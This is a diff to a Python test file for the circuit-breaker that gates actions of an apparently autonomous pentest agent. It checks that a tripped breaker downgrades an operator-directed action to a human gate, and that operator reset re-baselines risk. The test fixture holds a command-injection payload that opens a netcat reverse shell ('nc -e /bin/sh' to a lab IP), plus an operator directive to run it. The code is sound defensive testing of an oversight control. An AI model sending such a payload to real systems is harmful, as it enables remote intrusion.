@@ -247,6 +247,41 @@ def test_breaker() -> int:
     if e4 != "clear" or bc2["tripped"]:
         print(f"FAIL breaker cooldown: did not auto-clear (e4={e4})"); fails += 1
 
+    # live-path clamp (was untested — the breaker's MAIN job): under a tripped
+    # breaker, an effectful AUTO decision must become GATE via M.assess(), not just
+    # via the apply_breaker unit. An operator-directed gate effect on the in-scope
+    # target (reverse shell) is (GATE,"AUTO") via autonomy_decision rule 5 — NOT
+    # local-workspace housekeeping (rule 1) — so it is genuinely effectful (level GATE).
+    eff_act = C.normalize_action(
+        "Bash", "curl 'http://192.168.191.138:8080/vulnerabilities/exec/' "
+                "--data 'ip=1;nc -e /bin/sh 192.168.191.138 4444'")
+    eff_ctx = {"scope_hosts": set(SCOPE),
+               "directives": ["operator: 用 nc -e 反弹 shell 到 192.168.191.138 4444 经 exec"],
+               "plan_keywords": list(SCOPE), "taint": False}
+    r_clean = M.assess(eff_act, eff_ctx, {"egress_bytes": 0, "request_count": 0, "auth_fails": 0})
+    tripped = {"egress_bytes": 0, "request_count": 0, "auth_fails": 0,
+               "breaker": {"tripped": True, "reason": "test", "until": 9e18,
+                           "hijack_streak": 0, "escalation_hits": 0, "risk_baseline": 0.0}}
+    r_trip = M.assess(eff_act, eff_ctx, tripped)
+    if r_clean["decision"] != "AUTO":
+        print(f"FAIL breaker clamp-assess setup: expected operator-directed AUTO, got "
+              f"L{r_clean['level']}/{r_clean['decision']} (adjust test fixture)"); fails += 1
+    elif r_trip["decision"] != "GATE" or "clamped" not in r_trip["decision_reason"]:
+        print(f"FAIL breaker clamp-assess: effectful AUTO not clamped via assess "
+              f"(got L{r_trip['level']}/{r_trip['decision']})"); fails += 1
+
+    # operator-reset must ALSO re-baseline T2 (the earlier reset test used risk=0,
+    # so it never exercised the baseline; this is a distinct code path).
+    bo = D._fresh_breaker()
+    bo, _ = D.breaker_eval(bo, taint_hot=False, this_effectful=False, this_escalation=False,
+                           risk_score=3.0, now=now, ts="t")                 # trip via T2
+    bo, eoc = D.breaker_eval(bo, taint_hot=False, this_effectful=False, this_escalation=False,
+                             risk_score=3.0, now=now + 1, ts="t", operator_reset=True)  # reset+rebaseline
+    bo, eot = D.breaker_eval(bo, taint_hot=False, this_effectful=False, this_escalation=False,
+                             risk_score=3.2, now=now + 2, ts="t")           # +0.2 fresh -> must NOT trip
+    if eoc != "clear" or eot == "trip" or bo["tripped"]:
+        print(f"FAIL breaker operator-reset re-baseline: re-tripped on lifetime risk (eoc={eoc} eot={eot})"); fails += 1
+
     # T2 latch regression: after a clear, T2 must re-baseline so lifetime risk_score
     # (which only grows) does NOT re-trip on the next finding. (bug found in self-audit)
     bl = D._fresh_breaker()
